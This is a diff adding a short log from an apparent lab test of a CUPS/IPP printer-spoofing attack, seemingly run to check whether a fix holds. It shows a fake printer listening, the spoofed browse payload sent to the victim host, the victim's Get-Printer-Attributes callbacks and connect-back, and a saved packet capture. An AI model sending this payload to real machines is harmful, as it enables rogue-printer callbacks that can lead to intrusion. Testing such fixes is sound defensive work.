@@ -1,0 +1,8 @@
+2026-10-28 12:12:47,857 INFO fake IPP printer listening on tcp/8631
+2026-10-28 12:12:48,859 INFO sending 1 packet(s) to 172.20.0.10:631 payload=b'0 3 ipp://172.20.0.1:8631/printers/AfterFixSpoof "Lab" "HP LaserJet"\n'
+2026-10-28 12:12:48,902 WARNING CALLBACK: victim 172.20.0.10:48874 -> fake printer | POST /printers/AfterFixSpoof HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:12:48,903 WARNING CALLBACK: victim 172.20.0.10:48878 -> fake printer | POST /printers/AfterFixSpoof HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:12:48,903 WARNING CALLBACK: victim 172.20.0.10:48886 -> fake printer | POST /printers/AfterFixSpoof HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:12:49,911 INFO watching 10 s for the victim to connect back ...
+2026-10-28 12:12:59,920 WARNING RESULT: victim 172.20.0.10 opened TCP connection to 172.20.0.1:8631
+2026-10-28 12:12:59,927 INFO saved 41 packets to pcap_files/08_after_allow_spoofed.pcap
